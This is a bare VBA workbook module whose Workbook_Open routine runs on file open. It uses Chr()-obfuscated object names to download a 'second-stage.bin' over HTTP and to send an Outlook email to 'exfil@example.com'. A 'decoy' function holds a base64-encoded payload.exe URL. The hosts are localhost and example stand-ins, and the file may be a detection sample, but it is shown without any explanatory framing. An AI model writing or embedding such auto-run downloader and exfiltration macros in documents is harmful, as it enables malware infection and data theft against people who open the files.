Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim http As Object, url As String
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    url = "http://127.0.0.1:9090/second-stage.bin"
    Set http = CreateObject(Chr(77) & Chr(83) & Chr(88) & Chr(77) & Chr(76) & Chr(50) & Chr(46) & Chr(88) & Chr(77) & Chr(76) & Chr(72) & Chr(84) & Chr(84) & Chr(80))
    http.Open "GET", url, False
    http.Send
    Set olApp = CreateObject(Chr(79) & Chr(117) & Chr(116) & Chr(108) & Chr(111) & Chr(111) & Chr(107) & Chr(46) & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110))
    Set olMail = olApp.CreateItem(0)
    olMail.To = "exfil@example.com"
    olMail.Subject = "logs"
    olMail.Body = http.Status
    olMail.Send
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
